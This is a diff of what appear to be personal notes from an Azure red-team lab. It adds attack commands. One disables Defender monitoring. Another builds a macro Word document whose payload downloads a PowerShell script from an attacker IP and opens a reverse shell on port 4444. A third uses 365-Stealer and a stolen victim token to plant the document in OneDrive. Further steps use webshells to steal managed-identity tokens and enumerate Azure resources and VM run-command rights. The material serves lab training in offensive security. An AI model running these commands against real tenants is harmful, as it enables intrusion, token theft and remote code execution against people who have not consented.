@@ -176,10 +176,11 @@ Enter-PSSession -Session $officeVM
 Set-MpPreference -DisableRealtimeMonitoring $true
 
 #Generate document
-iex (New-Object Net.Webclient).downloadstring("http://172.16.150.x:82/Out-Word.ps1")
-Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.x:82/Invoke-PowerShellTcp.ps1');reverse -Reverse -IPAddress 172.16.150.x -Port 4444" -OutputFile studentx.doc
+iex (New-Object Net.Webclient).downloadstring("http://172.16.150.38:82/Out-Word.ps1")
+Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.38:82/Invoke-PowerShellTcp.ps1');reverse -Reverse -IPAddress 172.16.150.38 -Port 4444" -OutputFile student38.doc
 
 #Copy document
+exit
 Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc
 ```
 
@@ -190,7 +191,67 @@ C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
 
 #### Abuse the access token - Uploading word doc to OneDrive
 ```
-& 'C:\Program Files\Python38\python.exe' C:\xampp\htdocs\365-Stealer\365-Stealer.py --upload C:\AzAD\Tools\studentx.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
+cd C:\xampp\htdocs\365-Stealer\
+
+& 'C:\Program Files\Python38\python.exe' 365-Stealer.py --upload C:\AzAD\Tools\studentx.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
+```
+
+## Insecure file upload
+- Upload a webshell to a insecure webapp
+- If command execution is possible execute command ```env```
+- if the app service contains environment variables IDENITY_HEADER and IDENTITY_ENDPOINT, it has a managed identity.
+- Get access token from managed identity using another webshell. Upload studentxtoken.phtml
+
+#### Check the resources available to the managed identity
+Throws an error and nikil is unsure why
+```
+$token = 'eyJ0eX...'
+
+Connect-AzAccount -AccessToken $token -AccountId <clientID> Get-AzResource
+```
+
+#### Use the Azure REST API to get the subscription id
+```
+$Token = 'eyJ0eX..'
+$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
+$RequestParams = @{
+ Method = 'GET'
+ Uri = $URI
+ Headers = @{
+ 'Authorization' = "Bearer $Token"
+ }
+}
+(Invoke-RestMethod @RequestParams).value
+```
+
+#### List all the resources available by the managed identity to the app service
+```
+$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-
+d52d5d388768/resources?api-version=2020-10-01'
+$RequestParams = @{
+ Method = 'GET'
+ Uri = $URI
+ Headers = @{
+ 'Authorization' = "Bearer $Token"
+ }
+}
+(Invoke-RestMethod @RequestParams).value
+```
+
+#### Check what actions are allowed to the vm
+- The runcommand privileges lets us execute commands on the VM
+```
+$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
+
+$RequestParams = @{
+Method = 'GET'
+Uri = $URI
+Headers = @{
+'Authorization' = "Bearer $Token"
+}
+}
+
+(Invoke-RestMethod @RequestParams).value
 ```
 
 # Authenticated enumeration
